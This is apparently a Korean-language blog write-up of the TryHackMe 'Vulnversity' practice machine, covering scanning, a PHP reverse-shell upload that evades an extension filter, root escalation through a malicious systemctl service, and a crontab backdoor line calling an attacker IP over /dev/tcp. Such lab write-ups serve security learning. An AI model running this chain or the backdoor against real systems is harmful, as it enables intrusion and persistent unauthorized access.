---
layout: post
title: "3. Vulnversity"
date: 2026-03-22
---

## 프로젝트 개요
본 프로젝트는 **TryHackMe**의 'Vulnversity' 머신을 대상으로 진행한 모의해킹 실습 과정입니다. 정보 수집부터 웹 취약점을 이용한 파일 업로드 공격, 그리고 특수한 SUID 권한(systemctl)을 이용한 권한 상승까지, 리눅스 기반 시스템 침투의 전 과정을 체계적으로 학습하였습니다.

---

## 키워드(keyword)
`nmap`, `gobuster`, `Burp Suite Intruder`, `SUID`, `systemctl exploit`, `Reverse Shell`

## 1. 정보 수집 (Information Gathering)
대상 시스템에서 활성화된 서비스와 포트를 식별하기 위해 `nmap` 스캐닝을 수행했습니다.

* **수행 내용:** 대상 IP(`10.67.168.61`)에 대한 모든 포트 및 서비스 버전 스캔 ("-sC", "-sV")
* **결과:** 21(FTP), 22(SSH), 139/445(Samba), 3128(Squid Proxy), 3333(HTTP) 포트가 열려 있음을 확인했습니다. 웹 서버는 **Apache 2.4.41**이 비표준 포트인 **3333**번에서 구동 중입니다.

```bash
nmap -sC -sV 10.67.168.61
```

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/1. 정보수집(nmap).png" alt="Nmap Scan Result" />
</div>

---

## 2. 서비스 분석 (Service Analysis)
3333번 포트에서 구동 중인 웹 서버의 숨겨진 디렉토리를 찾아내기 위해 `gobuster`를 활용했습니다.

* **수행 내용:** 공통 단어장(`common.txt`)을 이용한 디렉토리 브루트포싱
* 
```bash
gobuster dir -u http://10.67.168.61:3333 -w /usr/share/wordlists/dirb/common.txt
```
* **결과:** `/internal/`이라는 디렉토리를 발견했으며, 이 경로에 파일 업로드 기능이 존재함을 확인했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/2. 서비스 분석(gobuster).png" alt="Gobuster Directory Brute Force" />
</div>

---

## 3. 침투 수행 (Exploit)
발견한 파일 업로드 기능을 통해 리버스 쉘을 업로드하여 시스템 제어권을 획득하는 단계입니다. 서버 측에서 확장자 필터링이 존재하여 이를 우회하는 과정을 거쳤습니다.

* **리버스 쉘 준비:** 칼리 리눅스의 기본 PHP 리버스 쉘 스크립트를 가져와 확장자를 우회 가능한 형태로 수정했습니다.
* 
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php php-reverse-shell.phtml
```

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/3-1. exploit(파일업로드).png" alt="Prepare Reverse Shell" />
</div>

* **공격 수행 (필터링 우회):** ".php" 확장자 업로드가 차단됨에 따라, **Burp Suite Intruder**를 사용하여 업로드 가능한 확장자를 퍼징(Fuzzing)했습니다. 그 결과, **".phtml"** 확장자가 필터링을 우회하고 업로드됨을 확인했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/3-2. exploit(burf suite).png" alt="Burp Suite Intruder Extension Fuzzing" />
</div>

* **쉘 획득:** 공격자 PC에서 `netcat`으로 대기("nc -lvnp 1234")한 상태에서 업로드된 파일을 실행하여, `www-data` 권한의 쉘을 획득했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/3-3. exploit(리버스 쉘).png" alt="Shell Gained via Netcat" />
</div>

---

## 4. 권한 상승 (Post-Exploit)
시스템 최고 권한인 `root`로 상승시키기 위해 로컬 정보 수집 및 분석을 진행했습니다.

* **SUID 설정 분석:** "find / -perm -4000 -print 2>/dev/null" 명령어를 통해 SUID 파일들을 검색했습니다.
* **취약점 발견:** 시스템 서비스 관리 도구인 **/bin/systemctl**에 SUID 비트가 설정되어 있는 것을 식별했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/4-1. post-exploit(SUID확인).png" alt="Searching SUID Files" />
</div>

* **공격 수행 (systemctl exploit):** root 권한으로 "/bin/bash"에 SUID 비트를 부여하는 악성 서비스 파일("root.service")을 작성하고, 이를 "systemctl"을 이용해 등록 및 실행했습니다.
* **결과:** "/bin/bash"에 SUID가 설정되었고, "bash -p" 명령어를 통해 root 권한을 획득하는 데 성공했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/4-2. post-exploit(권한상승성공).png" alt="Privilege Escalation via systemctl" />
</div>

---

## 5. 지속성 유지 (Persistence)
접근 권한을 고착화하기 위해 `crontab`에 백도어를 설정했습니다.

* **수행 내용:** 매 분마다 공격자 PC로 리버스 쉘 연결을 시도하는 명령어를 등록했습니다.
```bash
echo '* * * * * root bash -c \"bash -i >& /dev/tcp/192.168.216.48/9999 0>&1\"' >> /etc/crontab
```
* **성공 확인:** "tail -n 5 /etc/crontab" 명령어로 성공적으로 등록된 것을 확인했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Vulnversity/5. 백도어(crontab).png" alt="Setting Crontab Backdoor" />
</div>

---

## 마치며
이번 Vulnversity 실습은 웹 확장자 필터링의 취약점과 **systemctl** 같은 관리 도구의 SUID 오설정이 시스템 전체 보안에 미치는 치명적인 영향을 체감할 수 있는 기회였습니다. 

[결과 보고서 다운로드 받기](/files/hacking/Vulnversity/결과보고서(Vulnversity).docx)
